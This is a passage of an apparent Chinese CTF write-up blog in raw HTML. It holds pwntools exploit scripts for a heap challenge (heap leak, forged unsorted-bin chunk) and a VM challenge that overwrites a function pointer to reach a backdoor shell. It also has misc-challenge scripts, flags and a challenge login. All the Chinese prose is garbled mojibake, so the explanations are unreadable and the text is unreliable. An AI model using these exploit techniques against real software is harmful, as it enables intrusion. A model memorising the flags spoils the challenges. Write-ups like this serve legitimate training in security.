class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">ru(<span class="string">&#x27;text:&#x27;</span>)</span><br><span class="line">heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">echo(<span class="string">&#x27;HEAP BASE:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">edit(<span class="number">3</span>, p64(heap + <span class="number">0x2c0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>))</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv158sjq5uj61he0e6tbj02.jpg" alt=""></p><p>fake ub ä¼ªé€ å®Œæˆï¼Œä¸‹é¢å°±æ˜¯leakå‡ºæ¥libcçš„åœ°å€</p><p>å°´å°¬ï¼Œä¼ªé€ å¥½çªç„¶å‘ç°ubåœ¨æ–‡ç« çš„headeréƒ¨åˆ†ï¼Œç¨‹åºæ²¡æœ‰headeréƒ¨åˆ†çš„freeåŠŸèƒ½ï¼Œåªèƒ½é‡æ–°ä¼ªé€ äº†ï¼Œæ€è·¯æ˜¯ä¸€æ ·çš„</p><p><img src="/Users/lemon/Library/Application%20Support/typora-user-images/image-20211002192548895.png" alt=""></p><p>ç»è¿‡ä¸€ç‚¹ä¿®æ”¹åå°†å…¶ä¼ªé€ åˆ°äº†idxä¸º1çš„ä½ç½®ï¼Œæ€è·¯æ˜¯ä¸€æ ·çš„ï¼Œç°ç»™å‡ºå‰é¢éƒ¨åˆ†çš„exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))<span class="comment"># æ— è„‘ä¼ªé€ </span></span><br><span class="line">add(<span class="number">1</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">ru(<span class="string">&#x27;text:&#x27;</span>)</span><br><span class="line">heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">echo(<span class="string">&#x27;HEAP BASE:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">edit(<span class="number">3</span>, p64(heap + <span class="number">0x2c0</span> + <span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x10</span>) + p64(heap) +  p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>)) <span class="comment"># ä¼ªé€ ubï¼Œä¸­é—´æœ‰ä¸ªéƒ¨åˆ†å¡«å†™heapçš„åŸå› æ˜¯showçš„æ—¶å€™éœ€è¦å¯»å€ï¼Œéœ€è¦å¡«å†™ä¸€ä¸ªåˆæ³•åœ°å€</span></span><br></pre></td></tr></table></figure><p>ä¼ªé€ å‡ºubåé¢çš„å°±æ˜¯ç™½ç»™flagäº†</p><h3 id="caculator"><a href="#caculator" class="headerlink" title="caculator"></a>caculator</h3><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>ç®€ç®€å•å•çš„VM pwnï¼Œä¼°è®¡æ˜¯å…¨ç½‘æœ€ç®€å•çš„VM pwnäº†ï¼Œæä¾›äº†ç›´æ¥å’Œç¨‹åºæ¨¡æ‹Ÿçš„å¯„å­˜å™¨çš„äº¤äº’æ¥å£ï¼Œæ¼æ´ä½äºä¸€ä¸ªä»»æ„åœ°å€å†™ï¼Œbssä¸Šè¿˜æœ‰å‡½æ•°æŒ‡é’ˆï¼Œmainè¿˜è°ƒç”¨äº†è¿™ä¸ªæŒ‡é’ˆï¼Œç¨‹åºè¿˜æœ‰åé—¨ï¼Œæ”¹æŒ‡é’ˆä¸ºåé—¨å‡½æ•°ä¸€æŠŠğŸ”</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./caculator&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x40</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x400ba0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x48</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x48</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x38</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(-<span class="number">8</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x50</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>ç”šè‡³å¯ä»¥ä¸ç”¨pwntoolsç›´æ¥ncä¸Šå»getshell</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1d2sklx1j30fu0akq30.jpg" alt=""></p><h4 id="è¯¦è§£"><a href="#è¯¦è§£" class="headerlink" title="è¯¦è§£"></a>è¯¦è§£</h4><p>é™æ€ç¼–è¯‘ï¼ŒçŸ¥é“æœ‰äººæƒ³ğŸ”¨æˆ‘äº†</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1b77v9kfj61020nygnj02.jpg" alt=""></p><p>çƒ­çŸ¥è¯†ï¼Œmainåœ¨rdiå¯„å­˜å™¨é‡Œ</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1cuohlsrj60vk0bognn02.jpg" alt=""></p><p>å››è¡Œä»£ç ï¼Œç®€ç®€å•å•</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1b9h2zqnj30xw0u0gqf.jpg" alt=""></p><p>ç¬¬äºŒä¸ªå‡½æ•°æ‰æ˜¯ä¸»è¦é€»è¾‘ï¼Œä¸€å †caseï¼ŒVM pwnæ²¡è·‘äº†</p><p>æ— è®ºæ˜¯ç»éªŒï¼Œè¿˜æ˜¯ç°æœï¼Œå…ˆç¡®å®šä¸€äº›ç³»ç»Ÿå‡½æ•°ï¼š<a href="https://www.cnblogs.com/pengdonglin137/p/3345911.html">https://www.cnblogs.com/pengdonglin137/p/3345911.html</a></p><p>çœ‹åˆ°vaï¼Œprintfæˆ–è€…scanfç³»åˆ—çš„æ²¡è·‘äº†</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1cwejlwyj30u00vqtdx.jpg" alt=""></p><p>ä¸ç®¡æ˜¯ç”¨ç¨‹åºçš„é€»è¾‘è¯•è¿˜æ˜¯é€†å‘éƒ½å¾ˆå®¹æ˜“ç¡®å®šå‡ºæ¥å‰å››ä¸ªcaseåˆ†åˆ«æ˜¯åŠ å‡ä¹˜é™¤</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1cyytjt3j617i0kk78d02.jpg" alt=""></p><p>case 0x48å®ç°äº†popæ“ä½œï¼Œcase 0x40å®ç°äº†pushæ“ä½œï¼Œå¯ä»¥å‘æ ˆä¸Šå†™å…¥ä»»æ„æ•°æ®ï¼Œé€šè¿‡popå¯ä»¥æ§åˆ¶æˆ‘ä»¬è‡ªå·±å®ç°çš„å¯„å­˜å™¨regï¼Œå¹¶ä¸”case38å¯ä»¥å®ç°å‘ä»»æ„ä½ç½®å†™å…¥å¯„å­˜å™¨regçš„æ“ä½œï¼Œé€šè¿‡è¿™ä¸€å¥—æ“ä½œå®ç°äº†ä¸€ä¸ªä»»æ„åœ°å€å†™</p><p>æµç¨‹ï¼špush åé—¨å‡½æ•°åœ°å€ï¼Œpopå¼¹æ ˆï¼Œpopå¼¹æ ˆï¼ˆæ­¤æ—¶å¯„å­˜å™¨è¢«èµ‹å€¼ä¸ºåé—¨çš„åœ°å€ï¼‰ï¼Œåˆ©ç”¨ä»»æ„åœ°å€å†™å†™åˆ°å‡½æ•°æŒ‡é’ˆï¼Œé€€å‡ºæ‰§è¡Œgetshell</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1d0ev2asj60v207ujsh02.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1d1kiasaj619o0k4tec02.jpg" alt=""></p><p>å‡½æ•°æŒ‡é’ˆå°±åœ¨æ¨¡æ‹Ÿçš„æ ˆç©ºé—´çš„ä¸Šæ–¹ï¼Œç®—ä¸‹åç§»å¾ˆå®¹æ˜“ç®—å‡ºæ¥æ˜¯è´Ÿ8</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1d3bty13j615g0o4wk602.jpg" alt=""></p><p>é€šè¿‡æŸ¥çœ‹å­—ç¬¦ä¸²å¯ä»¥æ‰¾åˆ°åé—¨</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="bbbbbbaaaaaasssssseeeeee"><a href="#bbbbbbaaaaaasssssseeeeee" class="headerlink" title="bbbbbbaaaaaasssssseeeeee"></a>bbbbbbaaaaaasssssseeeeee</h3><p>ç»™äº†æ–‡æœ¬æ–‡ä»¶ï¼Œä¸€çœ¼è¿‡å»baseç¼–ç ï¼Œbaseè§£å®Œå‘ç°æ˜¯å¥—äº†ä¸åŒçš„baseï¼Œå†™ä¸ªè„šæœ¬å¾ªç¯è§£å¯†å®Œäº‹</p><p>å‡ºé¢˜è„šæœ¬å¦‚ä¸‹ï¼Œæˆ‘ç”¨çš„éšæœºæ•°ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“å•¥å¥—äº†å•¥ï¼Œæš´åŠ›ç ´è§£å°±å®Œäº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeFlag</span>(<span class="params">i, flag</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">0</span>):</span><br><span class="line">        flag = base64.b16encode(<span class="built_in">str</span>(flag).encode()).decode()</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">1</span>):</span><br><span class="line">        flag = base64.b32encode(<span class="built_in">str</span>(flag).encode()).decode()</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">2</span>):</span><br><span class="line">        flag = base64.b64encode(<span class="built_in">str</span>(flag).encode()).decode()</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">3</span>):</span><br><span class="line">        flag = base64.b85encode(<span class="built_in">str</span>(flag).encode()).decode()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;Bas3_1s_s0_b3autifu1!&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    flag = encodeFlag(random.randint(<span class="number">0</span>, <span class="number">3</span>), flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(flag.encode())</span><br></pre></td></tr></table></figure><p>è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    text = f.read()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        text = base64.b16decode(text).decode()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            text = base64.b32decode(text).decode()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                text = base64.b64decode(text).decode()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    text = base64.b85decode(text).decode()</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">print(text)</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4i8cfafqj60ca03st8z02.jpg" alt=""></p><h3 id="zzzzzziiiiiipppppp"><a href="#zzzzzziiiiiipppppp" class="headerlink" title="zzzzzziiiiiipppppp"></a>zzzzzziiiiiipppppp</h3><p>flag{D0nt_h1t_m3_N0_m0r3_01d_tr1ck5!}</p><p>çµæ„Ÿæ¥æºäºctfç”Ÿæ¶¯ä¸­åŠå…¶çŸ­æš‚çš„æ—¶é—´å†…ä»»èŒè¿‡ä¸€ä¸ªmiscæ‰‹è€Œæ‰“è¿‡çš„æ¯”èµ›ä¸­çš„æ— è„‘å¥—å¨ƒé¢˜â€”â€”ã€MRCTFã€‘åƒå±‚å¥—è·¯ï¼Œæœ¬é¢˜åˆé™ä½äº†éš¾åº¦ï¼Œå› ä¸ºå½“æ—¶è§£å‡ºæ¥å¥½åƒ</p><p>ç»™äº†å‹ç¼©åŒ…ï¼Œç¨å¾®è¯•è¯•å°±çŸ¥é“å¯†ç æ˜¯æ–‡ä»¶åï¼Œä½†æ˜¯å‹ç¼©åŒ…å¾ˆå¤šï¼Œæ‰‹è§£ä¸å¯èƒ½ï¼Œäºæ˜¯åªèƒ½æ“jioæœ¬</p><p>ç¨å¾®æŸ¥æŸ¥å°±çŸ¥é“pythonæœ‰ä¸ªåº“å«zipfileå¯ä»¥è§£ï¼Œä½†æ˜¯å¾ˆæ…¢ï¼Œæ‰€ä»¥ä¼šå†™shell jioæœ¬çš„åŒå­¦åº”è¯¥æ›´å®¹æ˜“æŠ¢åˆ°ä¸€è¡€ï¼Œä½†æ˜¯ğŸ‘´ğŸ»ä¸ä¼šshell jioæœ¬æ‰€ä»¥ğŸ‘´ğŸ»æ³¨å®šæŠ¢ä¸äº†ä¸€è¡€ï¼Œå› ä¸ºğŸ‘´ğŸ»æ˜¯å‡ºé¢˜äººï¼Œè·‘åäº†</p><p>ç°ç»™å‡ºå‡ºé¢˜ç”¨çš„jio æœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compressedFileToCreate</span>(<span class="params">random_number, prev_filename</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;prev:&#x27;</span> + prev_filename)</span><br><span class="line">    filename = <span class="built_in">str</span>(random_number) + <span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">    os.system(<span class="string">&quot;zip -P %s %s %s&quot;</span>%(<span class="built_in">str</span>(random_number), filename, prev_filename))</span><br><span class="line">    <span class="keyword">if</span> prev_filename[-<span class="number">4</span>:] == <span class="string">&#x27;.zip&#x27;</span>:</span><br><span class="line">        os.system(<span class="string">&#x27;rm &#x27;</span> + prev_filename)</span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randomNumberGeneration</span>():</span></span><br><span class="line">    number = string.digits</span><br><span class="line">    random_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        index = random.randint(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">        random_list.append(number[index])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(random_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        number = randomNumberGeneration()</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            prev_filename = compressedFileToCreate(number, <span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            prev_filename = compressedFileToCreate(number, prev_filename)</span><br></pre></td></tr></table></figure><p>è§£é¢˜è„šæœ¬å¾ˆç®€å•ï¼Œå°±æ˜¯å¾—ç­‰ä¸€ä¼šå„¿ï¼Œç­‰åˆ°æŠ¥é”™çš„æ—¶å€™ï¼Œå°±è¿˜æœ‰ä¸€ä¸ªæ–‡ä»¶æ²¡æœ‰è§£å¼€ï¼Œæ‰‹åŠ¨è§£å°±å®Œäº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">filename, prev_filename</span>):</span></span><br><span class="line">    fz = zipfile.ZipFile(filename + <span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    fz.extractall(pwd=<span class="built_in">bytes</span>(filename, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    name = fz.filelist[<span class="number">0</span>].filename[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">if</span> prev_filename:</span><br><span class="line">        os.system(<span class="string">&#x27;rm &#x27;</span> + prev_filename + <span class="string">&#x27;.zip&#x27;</span>)</span><br><span class="line">    fz.close()</span><br><span class="line">    <span class="keyword">return</span> filename,name</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    filename = <span class="string">&#x27;8366&#x27;</span><span class="comment"># åˆå§‹å‹ç¼©åŒ…æ–‡ä»¶å</span></span><br><span class="line">    prev_filename = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        prev_filename,filename = exp(filename, prev_filename)</span><br></pre></td></tr></table></figure><h3 id="WaterMark"><a href="#WaterMark" class="headerlink" title="WaterMark"></a>WaterMark</h3><p>å‡ºé¢˜æ€è·¯ï¼šå›¾ç‰‡ç›²æ°´å°ï¼Œforemost ç„¶åç”¨ç›²æ°´å°è„šæœ¬ä¸€æŠŠæ¢­</p><p>flag{water_mark_is_so_fun}</p><h3 id="letter"><a href="#letter" class="headerlink" title="letter"></a>letter</h3><p>é™„ä»¶ç»™äº†ä¸€ä¸ªpdf</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5q8fuo9aj61ec0rewjh02.jpg" alt=""></p><p>æ³¨æ„åˆ°åé¢æœ‰ä¸ªncåœ°å€ï¼Œè¿ä¸Šå»å‘ç°éœ€è¦è¾“å…¥usernameå’Œpasswordï¼Œä½†æ˜¯ä¸çŸ¥é“ï¼Œpdfä¸­æœ‰usernameå’Œpasswordï¼Œè™½ç„¶æŒ¡ä½äº†ï¼Œä½†æ˜¯èƒ½å¤Ÿç›´æ¥å¤åˆ¶å‡ºæ¥ï¼Œå¾—åˆ°usernameå’Œpasswordåˆ†åˆ«ä¸ºlemonå’Œl3m0n_l0v3_rgbï¼Œç„¶åncè¿ä¸Šå»è¾“å…¥ç”¨æˆ·åå’Œå¯†ç </p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5qpl745kj614g0d2mzg02.jpg" alt=""></p><p>è·å¾—ä¸€ä¸ªç½‘å€ï¼Œæˆ‘ä»¬ç”¨webç«¯è®¿é—®ä¸€ä¸‹çœ‹çœ‹</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5qtajoe8j60qk0jgq4i02.jpg" alt=""></p><p>æœ‰ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥åº·åº·</p><p>éƒ¨åˆ†å†…å®¹ï¼š</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5qttlz10j60d00ii0tz02.jpg" alt=""></p><p>ç»“åˆåˆšæ‰çš„å¯†ç ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯ä¸ªrgbå›¾åƒçš„åƒç´ ç‚¹ï¼Œå¹¶ä¸”è¿˜ç»™äº†å®½å’Œé«˜ï¼Œåˆ©ç”¨PILåº“åˆæˆåƒç´ ç‚¹è·å¾—flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">2012</span></span><br><span class="line">y = <span class="number">1014</span></span><br><span class="line"></span><br><span class="line">img = Image.new(<span class="string">&quot;RGB&quot;</span>,(x,y))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./tmp.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:<span class="comment"># è®°å¾—åˆ æ‰å‰ä¸¤è¡Œçš„å®½å’Œé«˜æ–¹ä¾¿æ•°æ®å¤„ç†</span></span><br><span class="line">    <span class="keyword">for</span> width <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,x):</span><br><span class="line">        <span class="keyword">for</span> height <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,y):</span><br><span class="line">            line = f.readline().strip(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">            rgb = line.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            img.putpixel((width,height),(<span class="built_in">int</span>(rgb[<span class="number">0</span>]),<span class="built_in">int</span>(rgb[<span class="number">1</span>]),<span class="built_in">int</span>(rgb[<span class="number">2</span>])))</span><br><span class="line"></span><br><span class="line">img.save(<span class="string">&#x27;flag.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv5qvelkd1j61dl0u00w002.jpg" alt=""></p><p>flag{l3m0n_10v3_pdf_and_rgb}</p><h3 id="emoji-master"><a href="#emoji-master" class="headerlink" title="emoji-master"></a>emoji-master</h3><h4 id="å‡ºé¢˜äººè§†è§’"><a href="#å‡ºé¢˜äººè§†è§’" class="headerlink" title="å‡ºé¢˜äººè§†è§’"></a>å‡ºé¢˜äººè§†è§’</h4><p>ğŸ‘´ğŸ»å°±æ˜¯æŠ½è±¡ï¼Œæ‰€ä»¥å°±æœ‰äº†è¿™ä¸ªé¢˜ï¼Œè‡´æ•¬æŠ½è±¡æ–‡å­¦</p><p>ç°ç¿»äº†ç¿»emojicodeå°±æŒºæœ‰æ„æ€ï¼Œæœ¬æ¥å¯ä»¥æ”¾å­—ç¬¦ä¸²çš„ï¼Œä½†æ˜¯æ²¡æœ‰èŠ‚ç›®æ•ˆæœï¼Œæ‰€ä»¥æ”¹æˆäº†emojiç¼–ç ï¼Œä½†æ˜¯æœ‰hintï¼Œé—®é¢˜ä¸å¤§</p><p>emojiéšæœºç”Ÿæˆè„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> emoji</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">emoji_list = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">:bowtie:</span></span><br><span class="line"><span class="string">:smile:</span></span><br><span class="line"><span class="string">:simple_smile:</span></span><br><span class="line"><span class="string">:laughing:</span></span><br><span class="line"><span class="string">:blush:</span></span><br><span class="line"><span class="string">:smiley:</span></span><br><span class="line"><span class="string">:relaxed:</span></span><br><span class="line"><span class="string">:smirk:</span></span><br><span class="line"><span class="string">:heart_eyes:</span></span><br><span class="line"><span class="string">:kissing_heart:</span></span><br><span class="line"><span class="string">:kissing_closed_eyes:</span></span><br><span class="line"><span class="string">:flushed:</span></span><br><span class="line"><span class="string">:relieved:</span></span><br><span class="line"><span class="string">:satisfied:</span></span><br><span class="line"><span class="string">:grin:</span></span><br><span class="line"><span class="string">:wink:</span></span><br><span class="line"><span class="string">:stuck_out_tongue_winking_eye:</span></span><br><span class="line"><span class="string">:stuck_out_tongue_closed_eyes:</span></span><br><span class="line"><span class="string">:grinning:</span></span><br><span class="line"><span class="string">:kissing:</span></span><br><span class="line"><span class="string">:kissing_smiling_eyes:</span></span><br><span class="line"><span class="string">:stuck_out_tongue:</span></span><br><span class="line"><span class="string">:sleeping:</span></span><br><span class="line"><span class="string">:worried:</span></span><br><span class="line"><span class="string">:frowning:</span></span><br><span class="line"><span class="string">:anguished:</span></span><br><span class="line"><span class="string">:open_mouth:</span></span><br><span class="line"><span class="string">:grimacing:</span></span><br><span class="line"><span class="string">:confused:</span></span><br><span class="line"><span class="string">:hushed:</span></span><br><span class="line"><span class="string">:expressionless:</span></span><br><span class="line"><span class="string">:unamused:</span></span><br><span class="line"><span class="string">:sweat_smile:</span></span><br><span class="line"><span class="string">:sweat:</span></span><br><span class="line"><span class="string">:disappointed_relieved:</span></span><br><span class="line"><span class="string">:weary:</span></span><br><span class="line"><span class="string">:pensive:</span></span><br><span class="line"><span class="string">:disappointed:</span></span><br><span class="line"><span class="string">:confounded:</span></span><br><span class="line"><span class="string">:fearful:</span></span><br><span class="line"><span class="string">:cold_sweat:</span></span><br><span class="line"><span class="string">:persevere:</span></span><br><span class="line"><span class="string">:cry:</span></span><br><span class="line"><span class="string">:sob:</span></span><br><span class="line"><span class="string">:joy:</span></span><br><span class="line"><span class="string">:astonished:</span></span><br><span class="line"><span class="string">:scream:</span></span><br><span class="line"><span class="string">:neckbeard:</span></span><br><span class="line"><span class="string">:tired_face:</span></span><br><span class="line"><span class="string">:angry:</span></span><br><span class="line"><span class="string">:rage:</span></span><br><span class="line"><span class="string">:triumph:</span></span><br><span class="line"><span class="string">:sleepy:</span></span><br><span class="line"><span class="string">:yum:</span></span><br><span class="line"><span class="string">:mask:</span></span><br><span class="line"><span class="string">:sunglasses:</span></span><br><span class="line"><span class="string">:dizzy_face:</span></span><br><span class="line"><span class="string">:imp:</span></span><br><span class="line"><span class="string">:smiling_imp:</span></span><br><span class="line"><span class="string">:neutral_face:</span></span><br><span class="line"><span class="string">:no_mouth:</span></span><br><span class="line"><span class="string">:innocent:</span></span><br><span class="line"><span class="string">:alien:</span></span><br><span class="line"><span class="string">:yellow_heart:</span></span><br><span class="line"><span class="string">:blue_heart:</span></span><br><span class="line"><span class="string">:purple_heart:</span></span><br><span class="line"><span class="string">:heart:</span></span><br><span class="line"><span 